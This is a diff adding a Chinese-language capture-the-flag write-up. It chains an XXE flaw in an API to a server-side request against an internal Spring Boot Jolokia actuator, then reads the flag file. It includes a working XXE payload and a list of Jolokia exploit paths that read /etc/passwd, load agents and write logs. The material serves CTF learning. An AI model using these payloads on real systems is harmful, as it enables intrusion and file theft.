@@ -74,3 +74,43 @@ Connection: close
 ```
 
 ## api_system
+
+>这个题，刚刚好拿来学习api,之前学习过springboot的利用思路。并且看到了知识星球的api学习。
+>自己一直卡在了绕过/actuator/jolokia/权限的问题，结果通过xxe去绕过。。。
+
+通过[APIKit工具](https://github.com/API-Security/APIKit)去扫描,存在/user/list接口测试发现存在xxe，之后就通过xxe打内网/actuator/jolokia/去绕过
+tips：内网端口通过/env去查看
+
+之后就通过/actuator/jolokia/接口的读文件去读flag.
+
+```xml
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+    <!ENTITY f SYSTEM "http://127.0.0.1:8080/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/flag">
+]>
+<id>&f;</id>
+```
+
+
+[jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit)
+
+```
+jolokia/
+jolokia/list
+jolokia?p=/read/jboss.jmx:alias=jmx%2Frmi%2FRMIAdaptor/State
+jolokia/exec/java.lang:type=Memory/gc
+jolokia/list?maxObjects=100
+jolokia/read/java.lang:type=*/HeapMemoryUsage
+jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
+jolokia/search/*:j2eeType=J2EEServer,*
+jolokia/write/java.lang:type=Memory/Verbose/true
+jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
+jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
+jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
+jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
+jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
+jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
+```
+
+
